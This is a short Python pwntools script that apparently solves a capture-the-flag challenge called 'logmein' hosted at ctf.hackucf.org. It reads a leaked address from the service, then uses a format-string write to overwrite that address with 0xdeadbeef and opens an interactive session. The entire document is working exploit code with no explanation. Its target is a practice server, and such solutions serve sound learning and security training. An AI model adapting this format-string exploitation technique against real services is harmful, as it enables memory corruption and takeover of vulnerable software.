from pwn import *
import struct
io = remote("ctf.hackucf.org", 7006)

exe = context.binary = ELF('logmein')
dress = int(io.recvline().split(b'=')[1].strip(), 16)
print(dress)
def sendLoad(payload):
    #io = remote("ctf.hackucf.org", 7006)
    #dress = int(io.recvline().split(b'=')[1].strip())
    io.recvline()
    io.sendline(payload)
    return io.recvline().split(b':')[1].strip()

fmt = FmtStr(sendLoad, offset=6)
fmt.write(dress, 0xdeadbeef)
fmt.execute_writes()
io.interactive()